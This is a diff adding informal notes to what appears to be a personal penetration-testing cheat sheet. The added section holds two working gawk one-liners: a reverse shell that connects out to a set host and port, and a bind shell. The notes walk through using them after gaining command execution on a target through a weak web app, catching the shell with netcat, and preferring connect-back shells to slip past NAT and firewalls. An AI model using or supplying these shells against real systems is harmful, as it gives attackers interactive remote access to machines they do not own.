@@ -155,3 +155,28 @@ tcpdump -i eth1 -vvvv -w capture.pcap
 -remmina rdp pxip
 --jvisualvm or jconsole
 -service xrdp stop
+
+############
+# Daniel's #
+############
+gawk 'BEGIN {P=443;S="bkd> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
+change P to the port you want it to connect to
+and H to the host you connect to
+so..
+say i am goign to attack skunkworks
+i have command exectution on skunkworks through some shit web app for instance
+to get a shell, i would modify that bullshit
+to connect back to my machine
+and on my machine, nc -nlvp 443
+then execute that gawk shit on skunkworks, and get a shell
+on my machine as www user or whatever
+gawk 'BEGIN {P=88;S="bkd> ";V="/inet/tcp/"P"/0/0";while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
+that's a bind shell
+so you can modify that
+change P=88 to whatever port you want it to bind a shell on
+then from my machine, nc skunkworks 88
+and i have a shell
+the connect back shells are typically the go-tos
+because shit may be behind NAT
+and a lot of times, people firewall incoming everything, then allow each service
+so the bind shell may succeed, but you cant get to it because firewall
